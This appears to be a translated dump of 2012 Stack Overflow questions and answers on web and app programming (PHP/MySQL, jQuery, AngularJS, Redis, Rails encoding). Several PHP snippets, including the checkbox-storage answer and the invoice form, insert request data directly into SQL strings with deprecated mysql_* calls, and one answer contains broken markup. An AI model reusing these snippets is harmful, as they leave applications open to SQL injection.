> 时间：2012-12-26T11:46:55.440

尝试这样的事情：

```
<g:select
    id="resource-type" 
    name="resource-type" 
    from="${resultMap?.keySet()}" 
    onchange="${remoteFunction(controller: 'mycontroller', action: 'action1', params:'\'id=\' + this.value')}" /> 
```

# asp.net-mvc - 带有母版页的 jQueryUI

> ID：14039888
> 
> 赞同：0
> 
> 时间：2012-12-26T11:21:57.087
> 
> 标签：asp.net-mvc, jquery-ui, master-pages

所以我最近开始使用 jQuery、jQueryUi 和 ASP.NET MVC。我一直在尝试在 MVC 页面中使用 jQueryUi 小部件，如选项卡、菜单等。

现在，这些小部件在没有母版页的情况下可以正常工作。但是当图片中涉及到母版页时，似乎给出了错误

> 对象不支持属性或方法“菜单”

或者

> 对象不支持属性或方法“选项卡”

等等

现在，我用谷歌搜索了这个问题，这似乎是在母版页中使用 jQuery 时的常见问题。

因此，如果有人能告诉我使这些东西与母版页一起工作的正确方法是什么，请告诉我。

而且我没有发布代码，因为这总是会发生！我尝试过不同的代码、不同的页面，而且我总是直接从 jQueryUi 网站复制代码。所以代码一定是对的。如果没有母版页，它确实可以很好地工作！所以我正在寻找一个通用的解决方案......而不仅仅是特定代码的解决方案。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T08:48:05.250

我想通了..显然标签的书写顺序很重要...

对我来说..这是有效的..

```
<script src="../../Scripts/jquery-1.8.3.js"></script>
<script src="../../Scripts/jquery-ui-1.9.2.custom.js"></script>
<link href="../../Content/themes/base/jquery-ui.css" rel="stylesheet" /> 
```

# c++ - Direct2d 屏幕外渲染错误？

> ID：14039889
> 
> 赞同：0
> 
> 时间：2012-12-26T11:22:00.707
> 
> 标签：c++, visual-studio-2010, direct2d

我正在尝试使用屏幕外的 bitmaprendertarget 渲染位图，然后将其绘制在屏幕上。它工作得很好，但是当我尝试在其上渲染单独的位图时，就像渲染不起作用，它只会剪辑原始图片。

这是它的样子：http: [//img827.imageshack.us/img827/7991/clipped.png](http://img827.imageshack.us/img827/7991/clipped.png)

我正在使用与 hwndrendertarget 兼容的rendertarget。有趣的是，当我使用屏幕上的 hwndrendertarget 渲染它们时，它们就很好了。

像这样：http: [//img141.imageshack.us/img141/4825/workingj.png](http://img141.imageshack.us/img141/4825/workingj.png)

我正在使用 CopyFromRendertarget 将位图从 Rendertarget 中取出，因为由于某种原因，GetBitmap 不适用于我使用 Bitmaprendertarget。这是在 Visual Studio 2010 C++ 上。

有人知道这里发生了什么吗？

- - 编辑 - -

需要注意的一个有趣的事情是：我尝试在获取位图后进行清除，然后进行 EndDraw，但是它只获取第一个位图，而其他位图根本不会被绘制。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T14:54:16.517

我正在尝试一些东西，并注意到我根本不需要将 EndDraw 放入 bitmaprendertarget 即可获得所需的位图。当我使用屏幕外 RT 完成后，我可以在其上调用 EndDraw，它工作得很好。

# cordova - 如何在 Phonegap 中调用 wsdl webservice？

> ID：14039890
> 
> 赞同：1
> 
> 时间：2012-12-26T11:22:04.590
> 
> 标签：cordova

在这里，我写了我的 ajax 调用。通过相同的格式（在我写为[http://xxx.yyy.za/WebService1/Service.asmx/add](http://xxx.yyy.z.a/WebService1/Service.asmx/add)的 url 中）我可以访问我的网络服务。但我无法访问wsdl webservice。请帮助我。

```
$.ajax({
 type: "POST",
 contentType: "application/json; charset=utf-8",
 dataType: "json",
 url:    "https://lifesathi.com/services/MobileAppsService.svc?wsdl",
 data: '{username:"XXXX",password:"YYYY"}',
 success: function(msg) {
 alert(msg.d);
},
error: function(msg) {
     alert("Error");
}}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-28T05:41:30.477

请查看以下链接：

[链接 1](https://groups.google.com/forum/?fromgroups=#!msg/phonegap/jQA6dbawvvs/WL9AOa3rw-IJ)

[链接 2](http://kmithi.blogspot.in/2012/02/callling-web-services-in.html)

[链接 3](http://www.bennadel.com/blog/1853-Posting-XML-SOAP-Requests-With-jQuery.htm)

[链接 4](http://weblogs.asp.net/jan/archive/2009/04/09/calling-the-sharepoint-web-services-with-jquery.aspx)

[链接 5](http://www.ibm.com/developerworks/webservices/library/ws-wsajax/)

基本思想是，您可能需要围绕肥皂网络服务编写一个 json 包装器，以便设备可以发送/接收请求。

举个例子；从设备发送 JSON -> 服务器解析 JSON 输入 -> 服务器调用带有 JSON 输入的 SOAP -> 服务器解析 SOAP 响应 -> 服务器格式 JSON 响应 -> 发送回手机 -> 手机处理此 JSON 响应

# php - 使用 set 类型存储复选框值

> ID：14039894
> 
> 赞同：0
> 
> 时间：2012-12-26T11:22:34.327
> 
> 标签：php, mysql, set

> **可能重复：**
> [使用 php 和 mysql 将多个复选框值存储到数据库](https://stackoverflow.com/questions/14039190/store-multiple-checkbox-values-to-database-using-php-and-mysql)

如何使用 php 和 mysql 使用设置的列类型将复选框值存储到单个字段。是否可以？

我的代码：

```
<?php
$genre = serialize($_POST['genre']);
$query = "INSERT INTO myset(genre) values('" . $genre . "')";
mysql_query($query) or die(mysql_error());
?> 
```

它不工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T12:01:47.657

HTML

```
<input type="checkbox" name="genre[]" value="1">
<input type="checkbox" name="genre[]" value="2">.. 
```

PHP

```
<?php
$genre= @implode(',', $_POST['genre']);
$query = "INSERT INTO myset(genre) values('$genre')";
mysql_query($query) or die(mysql_error());
?> 
```

在此之后，您将在（单个）流派列中找到值“1,2”。

# angularjs - 在AngularJS中的链接函数内修改范围

> ID：14039896
> 
> 赞同：4
> 
> 时间：2012-12-26T11:22:41.533
> 
> 标签：angularjs

通常在 AngularJS 的所有示例/源代码中，范围的修改都是在控制器中完成的。在我的指令中，我需要从另一个指令（或它的范围）获取一些信息并将其放入范围（在指令模板中可见）。由于此信息对于该指令的所有实例都是通用的，因此使用范围绑定对我来说并不好。

所以我找到的唯一解决方案是在链接函数中修改实例范围：

```
link: function(scope, element, attr, parentCtrl) {      
  scope.data = parentCtrl.someData;      
} 
```

此解决方案有效。[Plnkr 示例](http://plnkr.co/edit/FR4PsYl76T1IJVwBCAus?p=preview)

问题：是否可以根据 AngularJS 哲学/风格修改链接功能的范围，还是有另一种解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T16:06:23.157

在指令中修改范围很好。至于在指令之间共享信息，有几种方法。一种是您描述的方式，您可以在其中访问父控制器并获取它的数据，另一种非常相似的方法是

```
scope.data = scope.$parent.data; 
```

代替

```
scope.data = parentCtrl.someData; 
```

不过，在指令之间共享内容的一般方法是使用服务。这将允许您将服务注入每个指令，并且它们可以共享值。您的初始方法（以及我所描述的方法）的问题是，如果您移动元素以使范围层次结构发生变化，您的代码将会中断。这就是为什么我建议对两者都使用服务的原因。我建议阅读[服务文档](http://docs.angularjs.org/guide/dev_guide.services.creating_services)。还有很多视频描述了如何设置它们：[http ://www.youtube.com/watch?v=1OALSkJGsRw](http://www.youtube.com/watch?v=1OALSkJGsRw)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T17:59:23.093

由于您在指令中创建**隔离范围**（在您的示例 plnkr 中），并且您希望允许父母在范围层次结构中“某处”（根据您对@MathewBerg 的评论），我相信您唯一的选择是使用修改范围的链接功能。

（我想你可以在 MainCtrl 上定义只有子指令应该调用的方法，但强制执行会很混乱并破坏封装）。

所以，为了回应@MathewBerg 已经说过的话，是的，修改指令/链接函数中的范围。

# php - php查找数组的数字范围

> ID：14039897
> 
> 赞同：-1
> 
> 时间：2012-12-26T11:22:46.587
> 
> 标签：php

我有一个这样的数组：

```
$d=array('good'=>10,'very good'=>20,'bad'=>1); 
```

当 13 个数字最接近数组的值时，我想从中找到密钥。

例如`$d`数组中的 16 接近 20。

像结果：

```
key:very good
value:20 
```

代码

```
$d=array('good'=>10,'very good'=>20,'bad'=>1);

$find=13;
foreach(array_chunk($find, 5) as $val) {
    echo reset($val) . "-" . end($val);
} 
```

对不起我的英语不好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:42:28.823

你可以试试

```
$d = array('good' => 10,'very good' => 20,'bad' => 1);

vprintf("Find:%d, Closest: %d, Grade: %s\n",findClosest($d,13));
vprintf("Find:%d, Closest: %d, Grade: %s\n",findClosest($d,16)); 
```

输出

```
Find:13, Closest: 10, Grade: good
Find:16, Closest: 20, Grade: very good 
```

使用的功能

```
function findClosest($array, $find) {
    $map = array_map(function ($v) use($find) {
        return abs($v - $find);
    }, $array);
    asort($map);
    return array($find,$array[key($map)],key($map));
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:38:23.780

这不是很漂亮的代码，但我认为它可以满足您的要求。

```
$d=array('good'=>10,'very good'=>20,'bad'=>1);

$closest = array('int' => -1, 'key' => null);
$find = 16;
foreach($d as $k=>$v) {
    if ($closest['int'] == -1) { $closest['int'] = abs($find-$v); $closest['key'] = $k; continue; }
    if (abs($find - $v) < $closest['int']) {
        $closest['int'] = abs($find-$v);
        $closest['key'] = $k;
    }
}

echo "key:".$closest['key']."
value:".$d[$closest['key']]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:49:51.203

试试代码

```
$d = array('good'=>10,'very good'=>20,'bad'=>1);
$find=13;

$result = get_closest($d , $find);
echo $result;

function get_closest($array  = array(), $key){
     $new_arr = array();
     foreach($array AS $index=>$arr){
         if($key < $arr)  {
            $new_arr[$index] = $arr - $key;
         }
         else{
             $new_arr[$index] = $key - $arr;
         }
     }

     $min_val = min($new_arr);
     $res = array_search( $min_val , $new_arr);
     return $res;
   } 
```

谢谢

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-12-26T11:38:02.657

您可以使用array_values函数将所有值作为$a，然后您可以对$a进行排序。排序后您可以在$find之间找到两个数字，然后您可以比较这两个数字。

# php - 在 Select 中显示 5,000 个结果

> ID：14039902
> 
> 赞同：-2
> 
> 时间：2012-12-26T11:23:19.380
> 
> 标签：php, ajax, database, select, option

目前，我有这样的事情：

```
<select>
    <?php
    foreach ($users as $user) {
        echo '<option value="' . $user->user_id . '">' . $user->user_name . '</option>';
    }
    ?>
</select> 
```

当然，如果有 20-50 个用户左右就可以了，但是如果我有 5,000 个用户呢？会发生什么？我应该使用这种方法还是实现一些 AJAX？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:27:29.297

### jQuery 令牌输入很好。

我们也有类似的设置！我们使用 jQuery [TokenInput](http://loopj.com/jquery-tokeninput/)插件。

### 截屏：

![](../Images/096bbde439ea3c40209be5b67917aa9c.png)

* * *

### 如果你用那种方式...

您的数据库没有遇到任何问题。但是您的浏览器挂起！:P *ps：由于性能原因，用户根本不会访问该站点。*

# wordpress - 在 wordpress 中仅搜索帖子（而不是页面）

> ID：14039908
> 
> 赞同：2
> 
> 时间：2012-12-26T11:23:40.620
> 
> 标签：wordpress

我希望 WP 搜索引擎只搜索帖子（现在它搜索帖子和页面） - 有人知道该怎么做吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T11:26:50.933

所以首先，在你的主题的functions.php文件中，添加这个函数：

```
function is_type_page() { // Check if the current post is a page
global $post;

if ($post->post_type == 'page') {
    return true;
} else {
    return false;
} 
```

}

接下来，在主题的 search.php 文件中（显示搜索结果的位置，您希望在循环之后添加以下行。它应该如下所示：

```
<?php while (have_posts()) : the_post(); ?>
<?php if (is_type_page()) continue; ?> 
```

# php - zend onChange 提交

> ID：14039912
> 
> 赞同：0
> 
> 时间：2012-12-26T11:23:49.863
> 
> 标签：php, javascript, forms, zend-framework, submit

我正在尝试在 Zend_Form_Element_Select 上提交带有事件“onchange”的表单，但我没有成功。使用一个简单的按钮 Zend_Form_Element_Submit 我没有问题，但我的列表中的 onchange 是不可能的。

我的表格上的代码：

```
$this->setName('myparamcliform');
$this->setAttrib('id', 'myformm');
$this->setAction('/first/second/index');

$Liste5 = new zend_psai_Liste();
$ListeActivite = $Liste5->ListeActivite();
$activite = new Zend_Form_Element_Select('activite',array('onchange' => "alert('hello 6');;"));
    $activite->setLabel('')
          ->setMultiOptions($ListeActivite); 
```

简单的警报消息没有问题，但是当我用提交功能替换它时，它不起作用。在网上找到的不同元素（感谢stackoverflow :)）我试过了：

```
 //documents.forms['myformm'].submit();
    //document.myparamcliform.submit();
    //->setAttrib('onChange', "this.form.submit();");
    //document.getElementById('myformm').submit()
    //,array('onchange' => 'this.form.submit();')

    $mysubmit = new Zend_Form_Element_Submit('mysubmit');
    $mysubmit->setLabel('RECHERCHER');

    $this->addElements(array($activite,$mysubmit)); 
```

使用这些不同的解决方案，它不起作用。“onchange”没有错误消息，也没有任何操作，但简单的警报消息没有问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:47:06.247

为什么不为按钮分配*类*或*id*并将函数绑定到它，该函数将在*some.js*文件中？

它肯定会起作用，这样您将提高脚本的可维护性。像这样的简单函数可以`alert()`内*联*编写，但更复杂的脚本最好与模板分开放置。

# iphone - 如何按其值对 plist 进行排序

> ID：14039913
> 
> 赞同：0
> 
> 时间：2012-12-26T11:24:01.047
> 
> 标签：iphone, ios, plist, sorting

我有带有字典列表（item0，item1，item2）的列表的Plist。我在图表中填充这个plist..它工作正常。在Plist中`key (date)-> Value(i store by using NSDate)`。现在我需要以这样的方式对Plist进行排序：- `graph`应该仅显示一周。说如果第一个值`26-Dec-12`不仅仅是最多`1-Jan-13`（1周）值plist应该显示

![第一的](../Images/5fa16e12fb5dfe17efc5023f9548e749.png) .

**代码**：

```
- (NSArray *)readFromPlist
{
// get paths from root direcory
NSArray *documentPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                             NSUserDomainMask, YES); 
NSString *documentsDirectory = [documentPaths objectAtIndex:0];
NSString *documentPlistPath = [documentsDirectory stringByAppendingPathComponent:@"calori.plist"];

NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:documentPlistPath];

valueArray = [dict objectForKey:@"title"];

  return valueArray;
} 
```

和

```
- (void)drawRect:(CGRect)rect {
// Drawing code

    CGContextRef _context = UIGraphicsGetCurrentContext();
ECGraph *graph = [[ECGraph alloc] initWithFrame:CGRectMake(10,10, 480, 320) 
                                    withContext:_context isPortrait:NO];

NSMutableArray *Array=[NSMutableArray arrayWithArray:[self readFromPlist]];

NSMutableArray *items = [[NSMutableArray alloc] init];

for (id object in [Array reverseObjectEnumerator]){

    if ([object isKindOfClass:[NSDictionary class]])
    {
        NSDictionary *objDict = (NSDictionary *)object;

           tempItemi  =[[ECGraphItem alloc]init];

        NSString *str=[objDict objectForKey:@"title"];
        NSLog(@"str value%@",str);
        float f=[str floatValue];

        NSString*str1=[objDict objectForKey:@"date"];

        NSLog(@" str values2-- %@",str1);

        tempItemi.isPercentage=YES;
        tempItemi.yValue=f;

        tempItemi.name=str1;

         [items addObject: tempItemi];

    }
}

[graph drawHistogramWithItems:items lineWidth:2 color:[UIColor blackColor]];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:28:53.650

您是否尝试过使用 NSSortDescriptor？

```
NSSortDescriptor *sortDesc = [[NSSortDescriptor alloc] initWithKey:@"DATE" ascending:YES selector:@selector(compare:)];
[yourDictionary sortUsingDescriptors:[NSArray arrayWithObject:sortDesc]]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:34:24.500

试试这个

```
NSString *path = [[NSBundle mainBundle] pathForResource:@"yourfile" ofType:@"plist"];
    NSDictionary *dict = [[NSDictionary alloc] initWithContentsOfFile:path];
    // sort it
    NSArray *sortedArray = [[myDict allKeys] sortedArrayUsingSelector:@selector(caseInsensitiveCompare:)];
    // iterate and print results
    for(NSString *key in sortedArray) {
        NSLog(@"key=%@,value=%@", key, [dict objectForKey:key]);
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T11:39:55.417

由于您的要求是在 7 天内过滤日期，

我给你一个逻辑，试试这个方法：

```
- (NSArray *)readFromPlistForOneWeek {

    NSArray *documentPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask, YES); 
    NSString *documentsDirectory = [documentPaths objectAtIndex:0];
    NSString *documentPlistPath = [documentsDirectory stringByAppendingPathComponent:@"calori.plist"];

    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:documentPlistPath];

    //loop through each of the item
    //and check if <8 then add that keyValue to array
    NSMutableArray *tempValueArray=[NSMutableArray new];
    for (NSDictionary *subDict in [dict objectForKey:@"title"]) {
       // NSLog(@"=> %@",subDict);

        NSString *plistDateString=[subDict objectForKey:@"date"];
        NSDate *currentDate = [NSDate date];

        NSDateFormatter *dateFormatter=[NSDateFormatter new];
        [dateFormatter setDateFormat:@"dd-MMM-yy"];

        NSDate *plistDate=[dateFormatter dateFromString:plistDateString];

        NSString *currentDateString=[dateFormatter stringFromDate:currentDate];

        NSTimeInterval secondsBetween = [plistDate timeIntervalSinceDate:currentDate];
        NSInteger dateDiff = secondsBetween / 86400;

        if( dateDiff<8 ){ //within 0-7 days
            [tempValueArray addObject:subDict];
        }
    }

    NSLog(@"valuArray : %@",tempValueArray);

    return tempValueArray;
} 
```

# mysql - 选择删除分类最多的用户以及分类的数量

> ID：14039915
> 
> 赞同：0
> 
> 时间：2012-12-26T11:24:17.973
> 
> 标签：mysql, sql

从如下表中，我如何选择删除分类广告最多的用户以及删除分类广告的数量？在这里：6 = 已删除。我正在使用 mySql。

```
"userid"    "classStatus"
"1"         "6"
"1"         "6"
"2"         "0"
"2"         "6"
"3"         "0"
"3"         "0" 
```

所以在这种情况下，输出将是：

```
"userid"    "numberofClassifieds"
"1"         "2"
"2"         "1" 
```

我对基本的 sql 语句没问题，但看不到找到一种方法来做到这一点。

```
select max(count(classStatus)) as t, userid as u from testtops where classStatus=6; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:30:30.000

这将选择至少有一个已删除类字段的所有用户，并将显示所有类字段的数量和所有已删除的类字段的数量：

```
SELECT
  userid,
  count(*) as numberofClassifieds,
  sum(classStatus=6) as numberofDeletedClassfields
FROM
  your_table
GROUP BY userid
HAVING numberofDeletedClassfields>0
ORDER BY numberofDeletedClassfields DESC 
```

**编辑：**这是一种使用连接的替代方法，它看起来不像其他查询那么优雅，但它确实更快：

```
SELECT dc.userid, c.numberofClassfields, dc.numberofDeletedClassfields
FROM
  (select userid, count(*) as numberofDeletedClassfields
   from your_table
   where classStatus = 6
   group by userid
   having count(*)>0) dc
  INNER JOIN
  (select userid, count(*) as numberofClassfields
   from your_table
   group by userid) c
  on dc.userid=c.userid
ORDER BY dc.numberofDeletedClassfields desc 
```

**EDIT2：**无论如何，如果您正在寻找已删除类字段的最大数量，那么您可以使用它：

```
select max(numberofDeletedClassfields)
from (
  select count(*) as numberofDeletedClassfields
  from your_table
  where classStatus = 6
  group by userid) s 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:26:21.627

你缺乏`GROUP BY`你的查询，

```
SELECT userid, COUNT(*) NumberOfClassified
FROM tableName
WHERE classStatus = 6
GROUP BY userID
ORDER BY NumberOfClassified DESC 
```

*   [SQLFiddle 演示链接](http://sqlfiddle.com/#!2/039df/1)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:27:14.760

```
select count(*) as numberofClassifieds, userid from testtops
where classStatus=6
group by userid 
```

试试这个

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-26T11:29:26.647

```
SELECT userid, COUNT(*) NumberOfClassified
FROM tableName WHERE classStatus = 6 
GROUP BY  userID 
ORDER BY NumberOfClassified DESC limit 1 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-26T12:02:41.030

请尝试下面给出的查询

```
SELECT `userid` , count(*) AS numberofClassifieds   FROM `testtops` where  `classStatus` = 6 group by `userid`  order by numberofClassifieds DESC 
```

谢谢

# ruby - 如何正确处理原子批处理？

> ID：14039916
> 
> 赞同：2
> 
> 时间：2012-12-26T11:24:18.193
> 
> 标签：ruby, redis, batch-processing

在我的应用程序中，有一个批处理机制。它（理论上）在 redis 列表中累积项目，然后一次处理所有项目并清理（如有必要）。这是代码：

```
def with_private_key redis, name
  return unless redis.exists name

  # atomically rename to a random name, so that the batch isn't appended to.
  tmpname = "temp:#{SecureRandom.hex}"
  redis.rename name, tmpname

  # get batch elements
  batch = redis.lrange(tmpname, 0, -1).map{|b| JSON.parse(b) }

  begin
    # actually do something with the batch
    yield batch
  rescue => ex
    # revert and give up
    redis.rename tmpname, name
    raise
  else
    # if there was no exception - drop the temp key, it's not needed anymore
    redis.del tmpname
  end
end 
```

这是这个实现的一个小问题：有时临时键不会被删除并保留在数据库中。当我撰写这个问题时，我意识到反向重命名可能会失败，因为已经创建了新的密钥和新的批次。

那么，我应该如何改进这个算法呢？

*   就地修改批处理不起作用。LRANGE + LTRIM 对不是原子的。
*   定期检查临时键并尝试重新处理它们（命名公式必须更改为包含`app_id`，但这在这里可能并不重要）。
*   还要别的吗？也许一些 Lua 技巧（还没有使用 Lua）？

### 编辑：

我看到我关于重命名的理论是无效的。[重命名命令](http://redis.io/commands/rename)：

> 将 key 重命名为 newkey。当源名称和目标名称相同或 key 不存在时，它会返回错误。如果 newkey 已经存在，它将被覆盖。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-27T05:31:11.253

我会尝试

```
batch, _ = redis.multi do |r|
  r.lrange name, 0, -1
  r.ltrim name, 0, -1
end 
```

如果客户端在获取批次并修剪列表后崩溃，则可能会丢失批次。

# mysql - Mysql2::Error: 不正确的字符串值 Rails 3 UTF8

> ID：14039918
> 
> 赞同：2
> 
> 时间：2012-12-26T11:24:26.187
> 
> 标签：mysql, ruby-on-rails, activerecord, utf-8, percona

我有一个应用程序可以处理大量其他语言的数据（网页标题和元描述）。我最近从 MySQL 切换到 Percona，发现了 MySQL 似乎默默地出错的所有错误。

我唯一没有设法修复的是

```
ActiveRecord::StatementInvalid: Mysql2::Error: Incorrect string value: 
```

我查看了当前的问题和答案，但它们都假设已知编码转换为 UTF8，我不知道编码。

我想做的是让 rails 将其转换为 UTF8（我尝试过 force_encoding 但没有用），或者我想检查它是否是 UTF8，如果没有摆脱它。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2015-02-01T19:34:06.400

我在尝试将 unicode emoji 插入 mysql 数据库时遇到了这个问题……您可能认为使用 utf8 是安全的，但事实并非如此。Emoji 使用 4 个字节，而 utf8 只使用 3 个字节。解决方案是使用 utf8mb4 编码和排序规则。

您可以通过首先更新您的 database.yml 来做到这一点，看起来像

```
development:
  adapter: mysql2
  database: my_database
  username: a_user
  password: the_password
  encoding: utf8mb4
  collation: utf8mb4_unicode_ci 
```

如果你有一个现有的数据库，你需要运行这个 sql：

```
ALTER TABLE `[table]` 
  CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_bin,
MODIFY [column] VARCHAR(250)
    CHARACTER SET utf8mb4 COLLATE utf8mb4_bin 
```

如果你还没有发布到生产中，你可以这样做

```
bundle exec rake db:drop db:create db:migrate 
```

[无耻地取自 Jason Seifer](http://jasonseifer.com/2014/06/20/rails-4-mysql-and-emoji-mysql2error-incorrect-string-value-error)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-06-05T08:03:42.427

我最近遇到了这个问题。它本质上是 mysql 默认排序规则类型不是 utf8_unicode_ci。

请执行下列操作。如果需要，请备份您的数据。我不得不删除数据库并重新创建它

```
rake db:drop
rake db:create 
```

将 mysql 数据库排序规则更改为 utf8_unicode_ci（phpMyAdmin 在这里可能会派上用场）最后，恢复您的迁移。

```
rake db:migrate 
```

享受。

# javascript - 提交带有 onclick 事件的表单不起作用

> ID：14039935
> 
> 赞同：0
> 
> 时间：2012-12-26T11:26:10.627
> 
> 标签：javascript, html, onclick, submit

我有一个提交表单，它将表单数据发布到一个名为`invoice-detail.php`. 在同一情况下，我想调用一个函数来处理几个值。我也尝试过，但 `onClick`没有工作。

请检查下面的代码，建议我如何在同一实例中执行这两个操作。

```
<?php include 'db.php'; ?>
<html>
<head>
<title>INVOICE Header</title>

<SCRIPT language=JavaScript>

function showda()
{
alert ("Show function !");
}

function showtin(str8)
{
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.open("GET","invtin.php?q8=" + str8,true);
xmlhttp.send();
}

function showcst(str10)
{
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.open("GET","invcst.php?q10=" + str10,true);
xmlhttp.send();
}

</script>

</head>
<body>

    <?php

echo "<form name='form1' method='post' target='mainFrame' action='invoice-detail.php'>";
echo "<table width='829' height='100' border='0' align='center' cellpadding='0' cellspacing='2'>";

echo "<tr>";
echo "<td height='39' width='99' class='sty1'>Invoice No</td>";

$res=mysql_query("select * from INVHDR_draft WHERE usr='$user'");
$row = mysql_fetch_assoc($res);
$tincst=mysql_query("SELECT TIN_No, CST_No, ECC_No FROM ACMAST where Ac_code='$cat'");
$tincst2=mysql_fetch_assoc($tincst);

echo "<td width='140'><input name='Inv_no' type='text' size='6' maxlength='6' value='$row[Invno]' onBlur=\"if (this.value == '' || this.value == 0) {alert('Invoice No. is required'); f1.Inv_no.focus();}\" onchange=\"showinvno(this.value);\"></td>";
echo "</tr>";

echo "<tr>";
echo "<td height='39' width='99' class='sty1' valign='bottom'>TIN</td>";
echo "<td width='140' valign='bottom'><input name='tin' type='text' size='15' maxlength='15' value='$tincst2[TIN_No]' onchange=\"showtin(this.value);\"></td>";

echo "<td width='203' class='sty1' valign='bottom'>CST ";
echo "  <input name='cst' type='text' size='15' maxlength='15' value='$tincst2[CST_No]' onchange=\"showcst(this.value);\"></td>";
echo "<td width='150' class='sty1' valign='bottom'>ECC No. ";
echo "  <input name='ecc' type='text' size='15' maxlength='15' value='$tincst2[ECC_No]' onchange=\"showcst(this.value);\"></td>";
echo "</tr>";
echo "</table>";

echo " <input type='submit' name='Submit' value='Process!' onClick=\"'showda();\">";

echo "</form>";

?>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:34:32.187

您可以`onclick`在此代码之后调用执行一些代码，您可以调用`formObject.submit()`

```
function showda()
{
  alert ("Show function !");
  formObject.submit(); //get your form object by id or tagname
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:35:03.913

而不是添加`onclick`到输入添加`onsubmit`到表单元素

`echo "<form name='form1' method='post' target='mainFrame' action='invoice-detail.php'> onClick=\"'return showda();\">";`

然后你可以更新你的`showda()`方法：

```
function showda()
{
  alert ("Show function !");
  // do your actions here
  // if they fail you can return false
  return true;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:37:37.983

```
 <?php include 'db.php'; ?>
    <html>
    <head>
    <title>INVOICE Header</title>

    <SCRIPT language=JavaScript>

    function showda()
    {
    alert ("Show function !");
    ////////do your processing here before submit//////

     document.form1.action="invoice-detail.php";
     document.form1.submit();
    }

    function showtin(str8)
    {
    if (window.XMLHttpRequest)
      {// code for IE7+, Firefox, Chrome, Opera, Safari
      xmlhttp=new XMLHttpRequest();
      }
    else
      {// code for IE6, IE5
      xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
      }
    xmlhttp.open("GET","invtin.php?q8=" + str8,true);
    xmlhttp.send();
    }

    function showcst(str10)
    {
    if (window.XMLHttpRequest)
      {// code for IE7+, Firefox, Chrome, Opera, Safari
      xmlhttp=new XMLHttpRequest();
      }
    else
      {// code for IE6, IE5
      xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
      }
    xmlhttp.open("GET","invcst.php?q10=" + str10,true);
    xmlhttp.send();
    }

    </script>

    </head>
    <body>

        <?php

    echo "<form name='form1' method='post' target='mainFrame' action=''>";
    echo "<table width='829' height='100' border='0' align='center' cellpadding='0' cellspacing='2'>";

    echo "<tr>";
    echo "<td height='39' width='99' class='sty1'>Invoice No</td>";

    $res=mysql_query("select * from INVHDR_draft WHERE usr='$user'");
    $row = mysql_fetch_assoc($res);
    $tincst=mysql_query("SELECT TIN_No, CST_No, ECC_No FROM ACMAST where Ac_code='$cat'");
    $tincst2=mysql_fetch_assoc($tincst);

    echo "<td width='140'><input name='Inv_no' type='text' size='6' maxlength='6' value='$row[Invno]' onBlur=\"if (this.value == '' || this.value == 0) {alert('Invoice No. is required'); f1.Inv_no.focus();}\" onchange=\"showinvno(this.value);\"></td>";
    echo "</tr>";

    echo "<tr>";
    echo "<td height='39' width='99' class='sty1' valign='bottom'>TIN</td>";
    echo "<td width='140' valign='bottom'><input name='tin' type='text' size='15' maxlength='15' value='$tincst2[TIN_No]' onchange=\"showtin(this.value);\"></td>";

    echo "<td width='203' class='sty1' valign='bottom'>CST ";
    echo "  <input name='cst' type='text' size='15' maxlength='15' value='$tincst2[CST_No]' onchange=\"showcst(this.value);\"></td>";
    echo "<td width='150' class='sty1' valign='bottom'>ECC No. ";
    echo "  <input name='ecc' type='text' size='15' maxlength='15' value='$tincst2[ECC_No]' onchange=\"showcst(this.value);\"></td>";
    echo "</tr>";
    echo "</table>";

    echo " <input type='submit' name='Submit' value='Process!' onClick='showda(); >";

    echo "</form>";

    ?>
    </body>
    </html> 
```

使用此代码

# php - 在特定时间和日期站点上播放视频

> ID：14039940
> 
> 赞同：1
> 
> 时间：2012-12-26T11:26:52.200
> 
